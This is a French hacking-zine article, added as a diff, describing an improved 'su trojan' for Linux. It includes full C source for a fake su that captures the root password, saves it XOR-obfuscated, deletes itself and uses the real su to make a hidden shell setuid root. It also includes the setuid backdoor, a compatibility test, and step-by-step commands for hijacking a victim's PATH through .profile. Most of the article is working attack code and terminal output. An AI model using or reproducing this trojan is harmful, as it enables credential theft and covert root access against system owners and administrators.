@@ -1,0 +1,434 @@
+                           Yet Another Su Troyan
+			   ---------------------
+
+  NOTE  :  Cette technique marchera ou pas selon la  configuration de votre
+           distribution...
+
+Introduction
+------------
+
+Tout le monde maintenant connaît le principe du 'SU Trojan'  qui consiste à
+changer le PATH d'un utilisateur pour qu'il exécute un programme se faisant
+passer pour su alors qu'il enregistre les mots de passe...
+Je rappelle le principe :
+
+hax0r a obtenu un shell non-root sur victim.b0x
+en lisant le .bash_history de l'utilisateur 'kalimero' il s'est rendu comp-
+te que ce dernier tappait régulièrement su pour passer root.
+hax0r place alors un faux su dans /tmp/.fake/su
+puis modifie le .profile de kalimero de façon à ce que son PATH ressemble à
+/tmp/.fake:/bin:/usr/bin:etc etc
+hax0r attends...
+
+kalimero finis par lancer un su (la version de hax0r)
+Il entre son mot de passe, le trojan l'enregistre, s'efface,  n'étant alors
+plus accessible dans le PATH, puis donne le message 'Invalid password'.
+kalimero qui pense avoir fait une erreur retape son pass et passe root
+
+Oui... mais c'est chiant quand même...
+--------------------------------------
+
+C'est vrai que en fonction de la façon dont l'utilisateur a passé son pass,
+il va plus ou moins laisser passer la chose...
+Il risque d'être méfiant dans les cas suivants :
+- il est l'admin et son pass et plus qu'important
+- il connait le 'truc' du su trojan
+- il avait la polio des doigts dans les  minutes précédentes et là il avait
+bien fait attention en tappant son pass...
+
+Dommage pour nous,  il regarde son PATH,  voit quelque  chose de bizarre et
+décide de changer de password...  si il est effectivement root il peut même
+regarder les logs et trouver quel est l'user qui a fait le ptit malin...
+
+Mais comment faire  pour récupérer le pass de  l'utilisateur sans lui faire
+utiliser un faux su ?
+Comment faire pour que l'utilisateur ait son shell root et nous son pass ?
+Histoire de régler ce problème je mis mes neurones en activité...
+
+Premier essai
+-------------
+Le premier truc auquel j'ai pensé c'était le sniffing de terminal (TTY). Je
+me  disais qu'en  lançant deux processus  en parallèle qui  lisent un  même
+terminal, je pourrais récupérer le password.
+J'avais donc  un premier prog qui lance su  puis fork un deuxième processus
+en fond qui lisait la console...
+Puis rien se passait...  j'ai commencé à étudier des codes comme ttysurf et
+toutes les codes  de sniffing de tty...  trop dur.  J'ai finalement utilisé
+ttyrec à la rescousse (un prog qui permet d'enregistrer ce qui se passe sur
+un terminal puis de 'rejouer' l'enregistrement plus tard).
+En étudiant les  enregistrements de ttyrec  il était  clair  que  le mot de
+passe que l'on donne à su ne passe pas vraiment par le tty.  En tout cas il
+est impossible de le récupérer de cette manière.
+
+Conlusion  de ce premier essai  :  on ne peut pas récupérer le pass avec le
+vrai su.
+
+Second essai
+------------
+En réalité je  me posais  la mauvaise question. Je cherchais à 'sniffer' le
+pass pour  le prendre  au vol.  La question  que j'aurais  du me poser  est
+"Comment passer root avec un programme ?"
+
+En effet puisque qu'on ne peut pas récupérer le root avec le vrai su, on va
+utiliser un faux su... On obtiendra donc le mot de passe root.
+Notre nouveau challenge  consiste alors à passer root  automatiquement et à
+donner un shell root à l'utilisateur comme si de rien n'était.
+
+Premier problème : comment un programme qui a le pass root devient root ?
+C'est vrai qu'il n'existe pas de fonction du style  ch_euid(login,pass) qui
+nous arrangerais bien.
+Il n'est pas non plus possible de passer le pass en ligne de commande comme
+le permettait mysql à une époque.
+La seule solution c'est  ouvrir un canal de communication. De la même façon
+que l'on 'bind' un shell sur un port,  nous allons ici  'binder'  su sur un
+canal de communication.
+J'ai choisi les sockets de type UNIX car les sockets réseaux nécessitent
+l'ouverture d'un port et sont donc plus facilement repérable. Pour ceux qui
+ne connaissent  pas  on peut  dire en gros  qu'un socket de  type UNIX  est
+l'équivalent d'un pipe.. ils sont souvent utiliser pour que deux programmes
+puissent communiquer.
+
+On a pour l'instant l'agorithme suivant :
+Afficher 'Password: '
+Lire le pass, l'enregistrer quelque part et le garder en mémoire
+Ouvrir un su sur une socket UNIX (serveur)
+Envoyer le pass sur la socket UNIX précédemment ouverte (client)
+
+Deuxième problème : comment donner le shell root ?
+A partir de cette  partie du coding,  il s'est posé un problème.  Qu'est ce
+qu'on fait ? On a ouvert un su... on le redirige vers l'utilisateur ?
+C'était beaucoup trop difficile à gérer.
+Solution : on crée une backdoor setuid root et on l'exécute.
+
+Après plusieurs  essais il était  évident qu'il fallait  minimiser les com-
+munications  sur la  socket.  Or le seul truc  nécessaire à envoyer  sur la
+socket c'est le mot de passe root.
+En effet on peut toujours passer les commandes avec l'option '-c' de su.
+
+Nouveau scénario
+----------------
+hax0r compile une backdoor suid (hsh.c) et la place à /tmp/.hsh
+hax0r change le .profile de l'utilisateur pour qu'il lance le faux su
+
+kalimero lance su
+kalimero rentre le mot de passe root
+-- notre programme récupère le pass root (enregistrement...)
+-- notre programme bind la commande
+   "su -c 'chown root.root /tmp/.hsh;chmod +s /tmp.hsh'" sur une socket
+-- notre programme fork un client qui passe le pass à su
+-- su récupère le pass et exécute les commandes passés en argument
+-- notre programme donne la main au shell suid root
+kalimero a son shell
+
+Au final :
+Kamilero a tappé son password une seule fois et a obtenu son shell root
+hax0r s'en tire avec une backdoor  suid root générée lors de l'exécution de
+la backdoor mais a aussi le mot de passe root :)
+kalimero n'a aucune raison de supposer qu'il s'est fait avoir
+
+Dans la pratique
+----------------
+hax0r a accès au compte de kalimero :
+(kalimero@victim) (suroot) $ ls
+HOWTO  hsh.c  Makefile  readpass.c  suroot.c  test.c
+(kalimero@victim) (suroot) $ make
+gcc -o hsh hsh.c
+gcc -o readpass readpass.c
+gcc -o suroot suroot.c
+gcc -o test test.c
+Now you can type 'make install' to place the backdoor in /tmp
+(kalimero@victim) (suroot) $ make install
+cp hsh /tmp/.hsh
+Use the test program to make sure suroot will work on the computer
+(kalimero@victim) (suroot) $ mkdir /home/kalimero/.bin
+(kalimero@victim) (suroot) $ cp suroot /home/kalimero/.bin/su
+(kalimero@victim) (suroot) $ echo export PATH=/home/kalimero/.bin:$PATH >> /home/kalimero/.profile
+(kalimero@victim) (suroot) $ ls -al /tmp/
+drwxrwxrwt    9 root     root         4096 2005-04-09 23:47 .
+drwxr-xr-x   25 root     root         4096 2005-01-08 19:53 ..
+-rwxr-xr-x    1 kalimero kalimero    11663 2005-04-09 23:47 .hsh
+
+kalimero (le vrai) veut passer root :
+(kalimero@victim) (~) $ su
+Password:
+root@victim #
+
+hax0r revient un peu plus tard :
+(kalimero@victim) (suroot) $ ls -al /tmp
+drwxrwxrwt    9 root     root         4096 2005-04-09 23:57 .
+drwxr-xr-x   25 root     root         4096 2005-01-08 19:53 ..
+-rwsr-xr-x    1 root     root        11663 2005-04-09 23:47 .hsh     <- shell suid root
+-rw-r--r--    1 kalimero kalimero        8 2005-04-09 23:57 .sb      <- password XORé
+srwxr-xr-x    1 kalimero kalimero        0 2005-04-09 23:57 .socksys <- fichier socket UNIX
+(kalimero@victim) (suroot) $ ./readpass
+k41im3r0
+(kalimero@victim) (suroot) $ /tmp/.hsh
+root@victim #
+
+Code
+----
+Nous avons  d'abord besoin d'un  code capable  de donner un shell root.  Là
+rien de compliqué...
+
+-- hsh.c --
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <errno.h>
+
+int main(int argc,char *argv[])
+{
+  setuid(0);
+  setgid(0);
+  execl("/bin/bash","/bin/bash",(char*)0);
+  return 0;
+}
+-- hsh.c --
+
+Voici maintenant le code de notre faux su :
+
+-- suroot.c --
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <string.h>
+#include <sys/un.h>
+#include <errno.h>
+#include <signal.h>
+#include <sys/wait.h>
+
+#define SU_PATH "/bin/su"        // le chemin vers le vrai su
+#define BD_PATH "/tmp/.hsh"      // le chemin vers le shell
+#define SOCK_UX "/tmp/.socksys"  // la socket UNIX qui sera utilisée
+#define PASSLOG "/tmp/.sb"       // le fichier où on enregistrera le pass
+
+/* la commande qui sera passée en paramêtre à su pour mettre
+ * la backdoor suid0
+ */
+#define CMD "chown root.root %s; chmod +s %s"
+
+/* Le message d'erreur de su (au cas où l'utilisateur se goure
+ * vraiment de mot de passe). A configurer en fonction de la
+ * langue de l'utilisateur
+ */
+#define SU_ERR "su: Mot de passe incorrect.\n"
+
+/* En cas d'erreur on quitte en prenant soin d'afficher le message
+ * d'erreur du vrai su
+ */
+void exit_on_err(void)
+{
+  fprintf(stderr,SU_ERR);
+  exit(1);
+}
+
+void exit_on_alarm(int sig_num)
+{
+  exit_on_err();
+}
+
+/* Auto-suppression de notre su, quelque soit la façon dont il a été
+ * lancé (chemin relatif ou absolu)
+ */
+void unlink_me(char *argv0)
+{
+  char cwd[PATH_MAX+1];
+  char dir[PATH_MAX+1];
+  if(argv0[0]=='/')
+    unlink(argv0);
+  else
+  {
+    if(strchr(argv0,'/')!=NULL)
+    {
+      if(getcwd(cwd,PATH_MAX+1)!=NULL)
+      {
+	sprintf(dir,"%s/%s",cwd,argv0);
+	unlink(argv0);
+      }
+    }
+  }
+}
+
+int main(int argc,char *argv[])
+{
+  int s,c,nc;
+  char *pass;
+  char *pass2;
+  char command[64];
+  FILE *fd;
+  int i;
+  int size;
+  struct sockaddr_un sun;
+  struct sockaddr_un remote;
+  struct stat st;
+
+  // On récupère le password sans la variable pass
+  if((pass=getpass("Password: "))==NULL)
+    exit_on_err();
+  
+  /* On ouvre notre fichier de password et on y met le pass
+   * XORé avec la valeur 0xFF
+   */
+  if((fd=fopen(PASSLOG,"wb"))!=NULL)
+  {
+    for(i=0;i<strlen(pass);i++)
+      fputc(pass[i]^0xFF,fd);
+    fclose(fd);
+  }
+  
+  /* Auto-destruction, le programme est en mémoire, la copie physique
+   * n'est plus utile
+   */
+  unlink_me(argv[0]);
+  // On efface la socket UNIX (prévoir une ancienne utilisation
+  unlink(SOCK_UX);
+
+  // Notre programme se divise en deux
+  if((i=fork())==-1)
+    exit_on_err();
+
+  if(i==0)
+  {
+    // Bienvenue dans la partie serveur
+    sun.sun_family=AF_UNIX;
+    strcpy(sun.sun_path,SOCK_UX);
+
+    // On crée la socket, on attend une connexion
+    if((s=socket(AF_UNIX,SOCK_STREAM,0))==-1)
+      exit_on_err();
+    if(bind(s,(struct sockaddr*)&sun,sizeof(struct sockaddr))==-1)
+      exit_on_err();
+    if(listen(s,1)==-1)
+      exit_on_err();
+    size=sizeof(struct sockaddr_un);
+    if((nc=accept(s,(struct sockaddr*)&remote,(socklen_t *)&size))==-1)
+      exit_on_err();
+    // on a une connexion, on redirige les entrées/sorties vers su
+    close(0);
+    close(1);
+    close(2);
+    dup2(nc,0);
+    dup2(nc,1);
+    dup2(nc,2);
+    sprintf(command,CMD,BD_PATH,BD_PATH);
+    // lancement du vrai su avec les commandes en paramêtre
+    execl(SU_PATH,"su","-c",command,(char *)0);
+    // su a le mot de passe, exécute les commandes et quitte
+    close(nc);
+    close(s);
+    exit(0);
+    // fini pour le serveur
+  }
+  else
+  {
+    // Le client est roi ;)
+    sun.sun_family=AF_UNIX;
+    strcpy(sun.sun_path,SOCK_UX);
+    // On tourne en boucle en attendant que la socket soit ouverte
+    while(stat(SOCK_UX,&st)==-1){}
+    
+    // connexion
+    if((c=socket(AF_UNIX,SOCK_STREAM,0))==-1)
+      exit_on_err();
+    if(connect(c,(struct sockaddr*)&sun,sizeof(struct sockaddr))==-1)
+      exit_on_err();
+    pass2=(char*)malloc(strlen(pass)+2);
+    sprintf(pass2,"%s\n",pass);
+    // on envoie à su le pass qu'on a récupéré
+    if(send(c,pass2,strlen(pass2),0)==-1)
+    {
+      free(pass2);
+      exit_on_err();
+    }
+    free(pass2);
+    /* On attend que la partie serveur soit terminée, de cette façon
+     * on est sûr que su a terminé
+     */
+    wait(NULL);
+    close(c);
+  }
+  i=1;
+  /* On défini une timeout de deux secondes pour l'opération suivante.
+   * Dans le cas où les deux secondes s'écoulent, on affiche le message
+   * d'erreur et on quitte
+   */
+  signal(SIGALRM,exit_on_alarm);
+  alarm(2);
+  /* On tourne en boucle tant que notre backdoor n'est pas setuid root */
+  while(i==1)
+  {
+    if(stat(BD_PATH,&st)==-1)
+      exit_on_err();
+    if( (st.st_mode & S_ISUID) && st.st_uid==0 && st.st_gid==0)i=0;
+  }
+  // Si on arrive ici on a gagné :)
+  alarm(0);
+  // On donne son shell root à l'utilisateur
+  execl(BD_PATH,BD_PATH,(char*)0);
+  
+  return 0;
+}
+-- suroot.c --
+
+Comme vous pouvez  le constater le principal soucis était que notre version
+de su soit aussi rapide que l'original...  ou du moins que la différence ne
+se remarque pas.  En utilisant la fonction  wait()  qui attend la  fin d'un
+processus et plus tard la fonction alarm() on minimise les risques.
+Le principal  risque est tout  simplement que cette technique ne fonctionne
+pas.  Selon la  configuration de votre  distribution,  su acceptera  ou pas
+d'être 'bindé' sur un canal de communication.
+J'ai codé  ce logiciel  sous une  SuSE 9.1  et tout  passait comme  dans du
+beurre :)
+Sous une  distribution basée sur Slackware je me suis  apperçu que mon pro-
+gramme était loin  de fonctionner partout.  Il ne fonctionnait pas non plus
+sur Ubuntu...
+
+Voici un petit bout  de code qui vous permettra de savoir  si votre système
+est vulnérable à cette technique :
+
+-- test.c --
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+
+int main(int argc,char *argv[])
+{
+  int dn;
+
+  printf("You must use this program first to know if suroot will work.\n");
+  printf("* you get a 'Password:' prompt -> it's good !\n");
+  printf("* you get 'su : must be run from a terminal' -> won't work !\n");
+  printf("--------------- press a key to continue ---------------\n");
+  getchar();
+  dn=open("/dev/null",O_RDWR);
+  close(0);
+  close(1);
+  dup2(dn,0);
+  dup2(dn,1);
+  execl("/bin/su","/bin/su",(char *)0);
+  close(dn);
+  return 0;
+}
+-- test.c --
+
+Voici ce que j'obtiens sur Ubuntu :
+(sirius@lotfree) (suroot) $ ./test
+You must use this program first to know if suroot will work.
+* you get a 'Password:' prompt -> it's good !
+* you get 'su : must be run from a terminal' -> won't work !
+--------------- press a key to continue ---------------
+
+su : doit être lancé à partir d'un terminal
+
+Tout le code est fournit avec le mag.
+hsh.c: backdoor
+readpass.c: décrypte le password enregistré
+suroot.c: programme principal
+test.c: savoir si le système est vulnérable
+
+sirius_black
